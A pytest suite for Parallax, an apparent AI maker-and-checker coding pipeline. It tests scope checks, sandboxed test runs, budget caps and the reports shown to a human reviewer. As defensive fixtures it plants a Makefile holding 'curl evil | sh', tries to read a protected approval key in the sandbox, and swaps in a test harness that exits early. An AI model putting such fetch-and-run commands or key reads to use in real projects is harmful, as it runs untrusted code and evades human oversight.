import subprocess
from pathlib import Path

import pytest

from fakes import FakeChecker, FakeDrafter, ScriptedAgent, blocker, good_probe, junit_runner
from sandboxcheck import why_not
from parallax import approvals, build, check, lifecycle, lint, pilot, review, sandbox, show, testrun, tree
from parallax.agents.base import Finding, Review
from parallax.cli import main
from parallax.core import Project
from test_lifecycle_gates import WANT, docs, make_key

GIT = ["git", "-c", "user.email=t@t", "-c", "user.name=t"]
NO_SANDBOX = why_not()  # None when the real sandbox starts here


def approved(repo, plan_edit=None, base_files=None):
    """A lifecycle task with its plan approved. base_files are committed first, as the base branch."""
    for rel, text in (base_files or {}).items():
        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
        (repo / rel).write_text(text)
    if base_files:
        subprocess.run(["git", "-C", str(repo), "add", "-A"], check=True)
        subprocess.run([*GIT, "-C", str(repo), "commit", "-qm", "base"], check=True)
    make_key()
    proj = Project.init(repo)
    d = docs()
    if plan_edit:
        d["plan"] = plan_edit(d["plan"])
    tid = lifecycle.new_intent(proj, "fix the readme", FakeDrafter(d))["task"]
    lifecycle.approve(proj, tid)
    return proj, tid, Path(proj.task(tid)["worktree"])


def built(proj, tid, steps):
    maker = ScriptedAgent(steps=steps)
    assert build.run_build(proj, tid, lambda left, settings: maker, preflight_runner=good_probe) == "built"
    return maker


def run(proj, tid, maker, checker=None, runner=None):
    return check.run_check(proj, tid, checker or FakeChecker(), lambda left, settings: maker,
                           test_runner=runner or junit_runner(), preflight_runner=good_probe)


def kinds(proj, kind):
    return [e for e in proj.ledger.entries() if e["kind"] == kind]


# code checks, before any model -----------------------------------------------------------------

def test_stage_takes_the_whole_worktree_and_leaves_its_index_alone(repo):
    proj, tid, wt = approved(repo)
    (wt / "README.md").write_text("hi\n")
    (wt / ".gitignore").write_text("build/\n")
    (wt / "build").mkdir()
    (wt / "build" / "out.txt").write_text("ignored\n")
    s = tree.stage(wt, proj.task(tid)["base"], wt.parent / "idx")
    assert sorted(s.files) == [".gitignore", "README.md"] and s.lines == 2
    assert "+hi" in s.diff and "build/out.txt" not in s.diff
    assert subprocess.run(["git", "-C", str(wt), "diff", "--cached", "--name-only"],
                          capture_output=True, text=True).stdout == ""
    assert tree.stage(wt, proj.task(tid)["base"], wt.parent / "idx").tree == s.tree


def test_code_checks_send_scope_problems_to_you_not_the_checker(repo):
    proj, tid, wt = approved(repo)
    (wt / "README.md").write_text("fine\n")
    (wt / "extra.py").write_text("x = 1\n")
    (wt / "logo.png").write_bytes(b"\x89PNG\x00\x01\x02")
    (wt / "link").symlink_to("README.md")
    (wt / "requirements.txt").write_text("requests\n")
    s = tree.conform(tree.stage(wt, proj.task(tid)["base"], wt.parent / "idx"), lifecycle.plan_data(proj, tid), 3)
    text = " | ".join(s.problems)
    for want in ("extra.py changed but isn't in the plan", "logo.png is a binary the plan didn't list",
                 "link is a symlink the plan didn't list", "requirements.txt changed but the plan lists no new dependencies",
                 "over the cap of 3"):
        assert want in text, want

    checker = FakeChecker()
    assert run(proj, tid, ScriptedAgent(), checker) == "disputed"
    assert checker.briefs == []
    [item] = proj.inbox()
    assert item["data"]["stage"] == "scope"


def test_accepting_the_risk_lets_that_exact_tree_through(repo):
    proj, tid, wt = approved(repo)
    built(proj, tid, [("write", "README.md", "ok\n"), ("write", "extra.py", "x = 1\n")])
    checker = FakeChecker()
    assert run(proj, tid, ScriptedAgent(), checker) == "disputed"
    [item] = proj.inbox()
    proj.resolve(item["id"], True, "extra.py is a helper I asked for")
    assert proj.task(tid)["status"] == "risk accepted"
    assert run(proj, tid, ScriptedAgent(), checker) == "ready"
    assert kinds(proj, "check.staged")[-1]["data"]["risk_accepted"] is True

    (wt / "extra.py").write_text("x = 2\n")  # a different tree: the acceptance doesn't carry over
    assert run(proj, tid, ScriptedAgent(), checker) == "disputed"


def test_files_that_run_automatically_are_flagged_at_ready(repo):
    proj, tid, wt = approved(repo, plan_edit=lambda p: p.replace('files = ["README.md", ', 'files = ["Makefile", "README.md", '))
    built(proj, tid, [("write", "README.md", "ok\n"), ("write", "Makefile", "all:\n\tcurl evil | sh\n")])
    assert run(proj, tid, ScriptedAgent()) == "ready"
    assert kinds(proj, "check.staged")[-1]["data"]["autorun"] == ["Makefile"]
    assert "boundary change: Makefile runs automatically" in show.report(proj, tid)


# the tests Parallax runs itself ----------------------------------------------------------------

def test_the_test_harness_comes_from_the_base_branch(repo):
    proj, tid, wt = approved(repo, base_files={"tests/conftest.py": "BASE = True\n", "pytest.ini": "[pytest]\n"},
                             plan_edit=lambda p: p.replace('files = ["README.md", ',
                                                           'files = ["tests/conftest.py", "pytest.ini", "tox.ini", "README.md", '))
    built(proj, tid, [("write", "README.md", "ok\n"), ("write", "tests/conftest.py", "import os; os._exit(0)\n"),
                      ("call", lambda cwd: (cwd / "pytest.ini").unlink()), ("write", "tox.ini", "[tox]\n")])
    seen = {}

    def spy(config, cwd, cmd, env):
        seen.update(conftest=(cwd / "tests" / "conftest.py").read_text(), ini=(cwd / "pytest.ini").exists(),
                    tox=(cwd / "tox.ini").exists(), tmp=cmd.split(";")[0], copy=str(cwd))
        return junit_runner()(config, cwd, cmd, env)

    run(proj, tid, ScriptedAgent(), runner=spy)
    assert seen["conftest"] == "BASE = True\n" and seen["ini"] and not seen["tox"]
    assert seen["tmp"].startswith("export TMPDIR=") and seen["tmp"].endswith("check-tmp")
    assert not seen["tmp"].split("=", 1)[1].startswith(seen["copy"])  # beside the copy, not in it
    assert sorted(kinds(proj, "tests.recorded")[-1]["data"]["harness_reset"]) == ["pytest.ini", "tests/conftest.py", "tox.ini"]


def test_tests_that_cant_run_come_to_you_not_the_maker(repo):
    proj, tid, wt = approved(repo)
    (wt / "tests").mkdir()
    maker = built(proj, tid, [("write", "README.md", "ok\n"), ("write", "tests/test_readme.py", "def test(): pass\n")])
    assert run(proj, tid, maker, runner=junit_runner(exit_code=4)) == "disputed"
    assert len(maker.goals) == 1 and not kinds(proj, "rework.started")
    assert "couldn't run" in proj.inbox()[0]["reason"]


def test_a_missing_planned_test_file_is_a_conflict_that_names_it(repo):
    """003876: the rework deleted the plan's test file, and all the card said was that tests couldn't run."""
    from parallax import decide
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])  # never writes tests/test_readme.py
    assert run(proj, tid, maker, runner=junit_runner(exit_code=4)) == "disputed"
    [item] = proj.inbox()
    assert item["data"]["stage"] == "conflict" and item["data"]["missing"] == ["tests/test_readme.py"]
    assert item["reason"] == "the plan's test file tests/test_readme.py is missing from the change, but your approved plan lists it"
    dec = decide.decision(proj, tid)
    assert dec.kind == "conflict" and "tests/test_readme.py is missing" in dec.question
    assert [o.name for o in dec.options] == ["reject", "drop"] and dec.recommend == "reject"


def test_failing_tests_go_back_to_the_maker_with_what_failed(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    runs = iter([junit_runner({"tests/test_readme.py": (2, 1)}, exit_code=1), junit_runner()])
    assert run(proj, tid, maker, runner=lambda *a: next(runs)(*a)) == "ready"
    assert "tests: tests/test_readme.py has 1 of 3 failing" in maker.goals[-1][1]
    per_file = kinds(proj, "tests.recorded")[-1]["data"]["per_file"]
    assert per_file["tests/test_readme.py"] == [3, 3, 0]


def test_only_review_md_blocking_severities_block(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    minor = Review("fail", [Finding("minor", "README.md:1", "wordy"), Finding("major", "", "no test")], "nothing")
    (proj.root / "REVIEW.md").write_text(review.TEMPLATE.replace("Blocking: blocker, major", "Blocking: blocker"))
    assert run(proj, tid, maker, FakeChecker(reviews=[minor])) == "ready"
    v = kinds(proj, "verdict.recorded")[-1]["data"]
    assert (v["verdict"], v["checker_verdict"]) == ("no_finding", "fail")
    assert review.blocking("no line here") == ("blocker", "major")


def test_parse_junit_counts_per_file(tmp_path):
    x = tmp_path / "j.xml"
    x.write_text('<testsuites><testsuite><testcase classname="tests.test_a" name="a"/>'
                 '<testcase classname="tests.test_a.TestX" name="b"><failure/></testcase>'
                 '<testcase classname="tests.test_b" name="c"><skipped/></testcase></testsuite></testsuites>')
    assert testrun.parse_junit(x, ["tests/test_a.py", "tests/test_b.py::c"]) == {
        "tests/test_a.py": [1, 2, 0], "tests/test_b.py": [0, 0, 1]}


@pytest.mark.skipif(NO_SANDBOX is not None, reason=NO_SANDBOX or "")
def test_the_tests_really_run_in_the_sandbox(repo):
    proj, tid, wt = approved(repo)
    (wt / "README.md").write_text("ok\n")
    p = build.prepare(proj, tid)
    s = tree.stage(wt, proj.task(tid)["base"], p.home / "idx")
    env = build.scrubbed_env(None)
    ok, _ = testrun.run(wt, s.base, s.tree, p.plan, p.home, None, env,
                        'python3 -c "import os; open(os.environ[\'TMPDIR\'] + \'/x\', \'w\')" {junit} {tests}')
    assert ok.exit == 0
    key = str(approvals.key_path())
    denied, _ = testrun.run(wt, s.base, s.tree, p.plan, p.home, None, env, f"cat {key} {{junit}} {{tests}}")
    assert denied.exit != 0


# the report -------------------------------------------------------------------------------------

def test_show_at_ready_is_the_plans_shape(repo, monkeypatch, capsys):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    assert run(proj, tid, maker) == "ready"
    t, v = kinds(proj, "tests.recorded")[-1], kinds(proj, "verdict.recorded")[-1]
    monkeypatch.chdir(proj.root)
    assert main(["show", tid]) == 0
    assert capsys.readouterr().out == (
        "Type: Decision needed\n"
        "Bottom line: Ready: Second Eye passed and 3 of 3 plan tests pass.\n"
        "Not looked at: nothing\n"
        f"Next: you run parallax accept {tid}, or reject it with a reason.\n"
        "Found\n"
        f"- the work: fixing the README install steps (docs/tasks/{tid}/intent.md:1)\n"
        f"- changed: README.md, 1 line; parallax diff {tid} shows it (ledger {kinds(proj, 'check.staged')[-1]['id']})\n"
        f"- tests: 3 of 3 passed (ledger {t['id']})\n"
        f"- Second Eye, the blind checker: pass, no findings (ledger {v['id']})\n"
        f"- outcome 1: tests/test_readme.py (ledger {t['id']})\n"
        f"- preflight: passed (ledger {kinds(proj, 'preflight.recorded')[-1]['id']})\n"
        f"- no harness files were reset (ledger {t['id']})\n")


def test_the_ready_card_says_which_outcome_no_test_exercises(repo):
    """Code only: the plan's covers against the JUnit counts. A cover that never ran is said plainly."""
    make_key()
    proj = Project.init(repo)
    d = docs()
    d["intent"] = d["intent"].replace("1. A new user on WSL can follow them.\n", "1. A new user on WSL can follow them.\n2. The doctor sample matches.\n")
    d["plan"] = d["plan"].replace('covers = { "1" = ["tests/test_readme.py"] }',
                                  'covers = { "1" = ["tests/test_readme.py"], "2" = ["tests/test_other.py"] }')
    tid = lifecycle.new_intent(proj, "fix the readme", FakeDrafter(d))["task"]
    lifecycle.approve(proj, tid)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    assert run(proj, tid, maker, runner=junit_runner({"tests/test_readme.py": (3, 0)})) == "ready"
    card = show.report(proj, tid)
    assert "- outcome 1: tests/test_readme.py (ledger " in card
    assert "- outcome 2: no test exercises this outcome (ledger " in card
    t = kinds(proj, "tests.recorded")[-1]
    assert f"- no harness files were reset (ledger {t['id']})" in card
    ids = {e["id"] for e in proj.ledger.entries()}
    assert lint.lint_report(card, root=proj.root, ledger_ids=ids) == []


def test_show_after_rework_says_what_changed_and_carries_the_checkers_gaps(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "one\n")])
    maker.steps["build"] = [("write", "README.md", "two\n")]
    passed = Review("pass", [Finding("minor", "README.md:1", "could be clearer")], "how it renders on GitHub")
    assert run(proj, tid, maker, FakeChecker(reviews=[blocker(), passed])) == "ready"
    text = show.report(proj, tid)
    assert "Changed since last time\n- rework 1 changed README.md (ledger " in text
    assert "Not looked at: Second Eye says: how it renders on GitHub." in text
    assert "README.md:1 minor: could be clearer (ledger " in text
    assert lint.lint_report(text, root=proj.root, ledger_ids={e["id"] for e in proj.ledger.entries()}, revisit=True) == []


def test_show_while_waiting_on_you_and_while_working(repo):
    proj, tid, wt = approved(repo)
    built(proj, tid, [("write", "README.md", "ok\n"), ("write", "extra.py", "x\n")])
    assert show.report(proj, tid).endswith(f"Next: you run parallax recheck {tid}.")
    run(proj, tid, ScriptedAgent())
    text = show.report(proj, tid)
    assert text.startswith("Type: Decision needed\nBottom line: Needs you: extra.py changed but isn't in the plan")
    assert lint.lint_report(text, root=proj.root, ledger_ids={e["id"] for e in proj.ledger.entries()}) == []
    proj.resolve(proj.inbox()[0]["id"], True, "fine")
    proj.ledger.append("check.started", "parallax", "", task=tid)
    assert show.report(proj, tid).startswith("Type: FYI\nBottom line: Task " + tid + " is checking.")


# commands ----------------------------------------------------------------------------------------

def test_recheck_needs_a_build_then_runs_in_the_background(repo, monkeypatch, capsys):
    proj, tid, wt = approved(repo)
    monkeypatch.chdir(proj.root)
    assert main(["recheck", tid]) == 1
    assert "hasn't been built" in capsys.readouterr().err
    built(proj, tid, [("write", "README.md", "ok\n")])
    spawned = []
    monkeypatch.setattr(build, "_spawn", lambda argv, env, cwd, log: spawned.append(argv) or 99)
    assert main(["recheck", tid]) == 0
    assert spawned[0][-1] == "check" and kinds(proj, "build.started")[-1]["data"]["mode"] == "check"


def test_reject_at_ready_redrafts_from_your_reason_and_drop_ends_it(repo, monkeypatch, capsys):
    proj, tid, wt = approved(repo)
    run(proj, tid, built(proj, tid, [("write", "README.md", "ok\n")]))
    spawned = []
    monkeypatch.setattr(build, "_spawn", lambda argv, env, cwd, log: spawned.append(argv) or 5)
    monkeypatch.chdir(proj.root)
    assert main(["reject", tid]) == 1  # a reject needs a reason: it's what the drafters redraft from
    assert main(["reject", tid, "--reason", "the tone is wrong for the README"]) == 0
    assert "redrafting" in capsys.readouterr().out and spawned[-1][-1] == "pilot"
    assert kinds(proj, "task.redraft")[0]["reason"] == "the tone is wrong for the README"
    assert proj.task(tid)["status"] == "drafting" and not (wt / "README.md").exists()  # the worktree is back at base

    proj.ledger.append("builder.finished", "parallax", "", task=tid, status="drafting")  # the redraft's pilot ends
    assert main(["reject", tid, "--drop", "--reason", "not worth it"]) == 0
    assert proj.task(tid)["status"] == "rejected"


def test_init_writes_review_md_once(repo):
    Project.init(repo)
    assert (repo / "REVIEW.md").read_text() == review.TEMPLATE
    (repo / "REVIEW.md").write_text("mine\n")
    Project.init(repo)
    assert (repo / "REVIEW.md").read_text() == "mine\n"


def test_show_keeps_a_long_reason_out_of_the_header(repo):
    proj, tid, wt = approved(repo)
    built(proj, tid, [("write", "README.md", "ok\n")])
    long = ("the plan's tests couldn't run (exit 4): ERROR: file or directory not found: "
            "tests/test_readme.py and a great many other words that would push the header past its cap of forty")
    item = proj.ledger.append("disagreement.raised", "parallax", long, task=tid, stage="check")
    text = show.report(proj, tid)
    assert "Bottom line: Needs you: the plan's tests couldn't run (exit 4)." in text
    assert f"- {long} (ledger {item['id']})" in text
    assert lint.lint_report(text, root=proj.root, ledger_ids={e["id"] for e in proj.ledger.entries()}) == []


# the budget cap --------------------------------------------------------------------------------

def test_a_task_stops_at_its_cap(repo):
    """003876's case: drafting counts, and a build that crosses the cap stops the task."""
    proj, tid, wt = approved(repo)  # drafting cost 0.2 of the 2.00 cap
    checker = FakeChecker()
    maker = ScriptedAgent(steps=[("write", "README.md", "ok\n")], cost=1.9)
    assert build.run_build(proj, tid, lambda left, settings: maker, preflight_runner=good_probe) == "stuck"
    [item] = proj.inbox()
    assert item["reason"] == "the budget cap ran out ($2.10 of $2.00 estimated)" and item["data"]["budget"]
    assert proj.task(tid)["status"] == "stuck" and checker.briefs == []
    assert show.report(proj, tid).startswith("Type: Decision needed\nBottom line: Needs you: the budget cap ran out")


def test_the_makers_budget_is_what_is_left_of_the_cap(repo, monkeypatch):
    """The cap is enforced at runtime: the maker's SDK budget is the rest of the cap, not the estimate."""
    proj, tid, wt = approved(repo)  # drafting cost 0.2 of the 2.00 cap
    seen = []
    maker = ScriptedAgent(steps=[("write", "README.md", "ok\n")])
    build.run_build(proj, tid, lambda left, settings: seen.append(left) or maker, preflight_runner=good_probe)
    assert seen == [pytest.approx(1.8)]
    from parallax.agents import claude
    monkeypatch.setattr(claude, "_load_sdk", lambda: object())
    assert build._maker(1.8, "settings.json").max_budget_usd == 1.8  # handed to the SDK, which stops there


def test_the_checkers_cost_can_stop_a_rework_before_it_starts(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    maker.cost = 1.4
    proj.ledger.append("maker.finished", "maker", "", task=tid, stage="build", status="done", cost_usd=1.4)
    costly = Review("fail", [Finding("blocker", "README.md:1", "wrong")], "nothing", cost_usd=0.5)
    assert run(proj, tid, maker, FakeChecker(reviews=[costly])) == "stuck"
    assert len(maker.goals) == 1 and not kinds(proj, "rework.started")  # the maker wasn't launched again
    assert "budget cap ran out" in proj.inbox()[0]["reason"]


def test_every_call_gets_what_is_left_as_its_ceiling(repo):
    proj, tid, wt = approved(repo)
    lefts = {}
    maker = ScriptedAgent(steps=[("write", "README.md", "ok\n")], cost=0.5)
    build.run_build(proj, tid, lambda left, settings: lefts.setdefault("maker", left) and maker, preflight_runner=good_probe)
    checker = FakeChecker()
    check.run_check(proj, tid, lambda left, model: lefts.setdefault("checker", left) and checker,
                    lambda left, settings: maker, test_runner=junit_runner(), preflight_runner=good_probe)
    assert lefts == {"maker": 1.8, "checker": 1.3}


def test_the_sdk_stopping_at_its_budget_comes_to_you(repo):
    proj, tid, wt = approved(repo)
    maker = ScriptedAgent(status="error", summary="stopped at the budget cap ($1.8)", cost=0.1)
    assert build.run_build(proj, tid, lambda left, settings: maker, preflight_runner=good_probe) == "stuck"
    assert "budget cap ran out" in proj.inbox()[0]["reason"]


def test_approval_refuses_a_cap_drafting_already_spent(repo):
    make_key()
    proj = Project.init(repo)
    drafter = FakeDrafter(docs(), cost=1.5)
    tid = lifecycle.new_intent(proj, "fix the readme", drafter)["task"]
    assert "Drafting this task has cost an estimated $1.50 so far" in drafter.requests[-1]
    with pytest.raises(Exception, match="isn't above what drafting already spent"):
        lifecycle.approve(proj, tid)


# intent versus plan: never the maker's to settle -----------------------------------------------

MKDIR_TESTS = ("call", lambda cwd: (cwd / "tests").mkdir(exist_ok=True))
SCOPE = Finding("major", "tests/test_readme.py", "the intent says the test suite stays unchanged; this adds a test",
                kind="scope")


def test_a_finding_against_the_approved_plan_comes_to_you_without_rework(repo):
    """003876's case: the checker says the intent forbids a file the approved plan lists."""
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n"), MKDIR_TESTS, ("write", "tests/test_readme.py", "def test(): pass\n")])
    other = Finding("major", "README.md:7", "step 7 is wrong")
    checker = FakeChecker(reviews=[Review("fail", [SCOPE, other], "nothing")])
    assert run(proj, tid, maker, checker) == "disputed"
    assert len(maker.goals) == 1 and not kinds(proj, "rework.started")  # the maker never touched it
    [item] = proj.inbox()
    assert item["data"]["stage"] == "conflict"
    assert item["reason"].startswith("intent and plan disagree") and "your approved plan lists tests/test_readme.py" in item["reason"]
    assert (wt / "tests" / "test_readme.py").exists()


def test_when_the_plan_wins_that_finding_stops_blocking(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n"), MKDIR_TESTS, ("write", "tests/test_readme.py", "def test(): pass\n")])
    checker = FakeChecker(reviews=[Review("fail", [SCOPE], "nothing")])
    run(proj, tid, maker, checker)
    proj.resolve(proj.inbox()[0]["id"], True, "the plan wins: the README needs a test")
    assert proj.task(tid)["status"] == "risk accepted"
    assert run(proj, tid, maker, checker) == "ready"


def test_scope_findings_off_the_plan_and_defects_still_go_to_rework(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    whole = Finding("major", "", "the change doesn't cover the Linux steps", kind="scope")
    assert run(proj, tid, maker, FakeChecker(reviews=[Review("fail", [whole], "nothing"), Review("pass")])) == "ready"
    assert len(kinds(proj, "rework.started")) == 1


def test_the_maker_can_say_a_finding_conflicts_with_the_plan(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    maker.status, maker.summary = "conflict", "conflict: fixing it means dropping a step the plan lists"
    assert run(proj, tid, maker, FakeChecker(reviews=[blocker()])) == "disputed"
    [item] = proj.inbox()
    assert item["data"]["stage"] == "conflict" and "Maker says a finding goes against" in item["reason"]


def test_a_rework_that_drops_an_approved_file_comes_to_you(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n"), MKDIR_TESTS, ("write", "tests/test_readme.py", "def test(): pass\n")])
    maker.steps["build"] = [("call", lambda cwd: (cwd / "tests" / "test_readme.py").unlink())]
    checker = FakeChecker(reviews=[blocker()])
    assert run(proj, tid, maker, checker) == "disputed"
    assert len(checker.briefs) == 1  # stopped before the re-check
    assert proj.inbox()[0]["reason"] == "the rework removed tests/test_readme.py, which your approved plan lists"


def test_no_report_means_the_tests_didnt_run_not_that_they_failed(repo):
    """python -m pytest without pytest exits 1, like a failure. Without a report it's not the maker's to fix."""
    proj, tid, wt = approved(repo)
    (wt / "tests").mkdir()
    maker = built(proj, tid, [("write", "README.md", "ok\n"), ("write", "tests/test_readme.py", "def test(): pass\n")])
    assert run(proj, tid, maker, runner=lambda c, cwd, cmd, env: (1, "No module named pytest")) == "disputed"
    assert len(maker.goals) == 1 and "couldn't run" in proj.inbox()[0]["reason"]


def test_build_byproducts_are_never_the_change(repo):
    """Live in M12: pytest's bytecode in a repo with no .gitignore became a scope problem for the human."""
    proj, tid, wt = approved(repo)
    (wt / "README.md").write_text("ok\n")
    (wt / "tests" / "__pycache__").mkdir(parents=True)
    (wt / "tests" / "__pycache__" / "test_readme.cpython-312.pyc").write_bytes(b"\x00\x01")
    (wt / ".pytest_cache").mkdir()
    (wt / ".pytest_cache" / "README.md").write_text("cache")
    s = tree.stage(wt, proj.task(tid)["base"], wt.parent / "idx")
    assert s.files == ["README.md"] and s.binaries == []


def test_results_name_files_even_when_the_plan_names_a_folder(tmp_path):
    """Live in M12: the plan's tests were ["tests/"], and the card listed tests.test_m11, not a file."""
    x = tmp_path / "j.xml"
    x.write_text('<testsuites><testsuite><testcase classname="tests.test_m11" name="a"/>'
                 '<testcase classname="tests.test_m12.TestX" name="b"><failure/></testcase></testsuite></testsuites>')
    assert testrun.parse_junit(x, ["tests/"]) == {"tests/test_m11.py": [1, 1, 0], "tests/test_m12.py": [0, 1, 0]}


def test_the_card_leads_with_what_matters(repo):
    """ee8178: the lead line said only that the cap was reached, and 12 per-file lines buried the failures."""
    proj, tid, wt = approved(repo, plan_edit=lambda p: p.replace('tests = ["tests/test_readme.py"]',
                                                                'tests = ["tests/test_readme.py", "tests/test_a.py", "tests/test_b.py"]'))
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    maker.cost = 1.6
    failing = junit_runner({"tests/test_readme.py": (3, 0), "tests/test_a.py": (7, 3), "tests/test_b.py": (1, 1)},
                           exit_code=1)
    assert run(proj, tid, maker, runner=failing) == "stuck"
    card = show.report(proj, tid)
    lines = card.splitlines()
    assert lines[1].startswith("Bottom line: Needs you: the budget cap ran out")
    [reason] = [line for line in lines if line.startswith("- the budget cap ran out")]
    assert "while rework was fixing failing tests in test_a, test_b" in reason
    assert "- tests: 11 of 15 passed; failures in test_a, test_b (ledger " in card
    assert "- no failing test file is one the diff changed; they may fail without this change too" in card
    assert "test_readme" not in card.split("failures in", 1)[1].split("\n", 1)[0]


# live in bb4040: the sandbox's empty placeholders reached the plan check, and the card led with .env -------------

BB4040 = [".env", ".env.development", ".env.development.local", ".env.local", ".env.production",
          ".env.production.local", ".env.test", ".env.test.local", ".gitmodules", ".npmrc", ".yarnrc",
          ".yarnrc.yml", "bunfig.toml", "package.json", "package-lock.json", "pnpm-lock.yaml", "yarn.lock"]


@pytest.fixture
def proj(repo, monkeypatch):  # bb4040's cases run the whole pilot
    make_key()
    monkeypatch.setattr(build, "_spawn", lambda *a: 1)
    return Project.init(repo)


def bb_run(proj, tid, maker, probe):
    return build.run_mode(proj, tid, "pilot", FakeDrafter(docs()), lambda left, settings: maker, FakeChecker(),
                          test_runner=junit_runner(), preflight_runner=probe)


def test_placeholders_left_before_the_build_never_reach_the_plan_check(proj):
    """The window bb4040 fell into: after the drafters' cleanup, before the build's own snapshot."""
    tid = pilot.intake(proj, WANT)["task"]
    wt = Path(proj.task(tid)["worktree"])

    def probe(config, cwd, spec, env):  # preflight runs between drafting and the build
        for name in BB4040:
            (wt / name).touch()
        return {"written": [], "readable": [], "network": [], "env": ["HOME", "PATH"], "env_values": []}

    maker = ScriptedAgent(steps=[("write", "README.md", "ok\n")])
    assert bb_run(proj, tid, maker, probe) == "ready"  # the build's guard runs parallax diff, which marks them intent-to-add
    staged = kinds(proj, "check.staged")[-1]["data"]
    assert staged["problems"] == [] and set(staged["files"]) <= {"README.md", "tests/test_readme.py"}
    assert not any((wt / n).exists() for n in BB4040)
    assert set(kinds(proj, "sandbox.cleaned")[-1]["data"]["files"]) == set(BB4040)
    assert not proj.inbox()


def test_a_placeholder_name_with_content_is_real_work_and_stays(proj):
    tid = pilot.intake(proj, WANT)["task"]
    wt = Path(proj.task(tid)["worktree"])
    (wt / ".env").write_text("TOKEN=abc\n")
    (wt / ".gitmodules").touch()
    assert sandbox.remove_leftovers(wt, {".gitmodules"}) == []  # the check leaves the plan's own files
    assert (wt / ".env").read_text() == "TOKEN=abc\n" and (wt / ".gitmodules").exists()


def staged_with(wt, files):
    s = tree.Staged(tree="t", base="b", diff="", files=list(files), lines=1)
    return tree.conform(s, {"files": ["README.md"], "binaries": [], "symlinks": [], "dependencies": []}, 400)


def test_many_findings_with_one_cause_read_as_one_line(tmp_path):
    for name in BB4040:
        (tmp_path / name).touch()
    why, files = tree.describe(staged_with(tmp_path, BB4040), tmp_path)
    assert why.startswith("17 files changed outside the plan's files, all empty (.env, .env.development and 15 more)")
    assert "dependencies" not in why and len(files) == 17 and {f["size"] for f in files} == {0}


@pytest.mark.parametrize("content, says", [
    ("", ".env changed but isn't in the plan's files, and it is empty"),
    ("SECRET=1\n", ".env looks like a secrets file and has content (9 bytes); .env changed but isn't in the plan's files"),
])
def test_a_secret_path_says_whether_it_has_content(tmp_path, content, says):
    (tmp_path / ".env").write_text(content)
    assert tree.describe(staged_with(tmp_path, [".env"]), tmp_path)[0] == says


def test_the_card_counts_and_lists_the_rest_under_details(proj):
    tid = pilot.intake(proj, WANT)["task"]
    wt = Path(proj.task(tid)["worktree"])
    for name in BB4040:
        (wt / name).touch()
    why, files = tree.describe(staged_with(wt, BB4040), wt)
    proj.ledger.append("disagreement.raised", "parallax", why, task=tid, stage="scope", files=files)
    text = show.report(proj, tid)
    ids = {e["id"] for e in proj.ledger.entries()}
    assert lint.lint_report(text, root=proj.root, ledger_ids=ids) == []
    head, details = text.split("\nDetails\n", 1) if "\nDetails\n" in text else (text, "")
    assert "Bottom line: Needs you: 17 files changed outside the plan's files, all empty" in head
    assert "yarn.lock" not in head and all(f"{n}: not in the plan, empty" in details for n in BB4040)

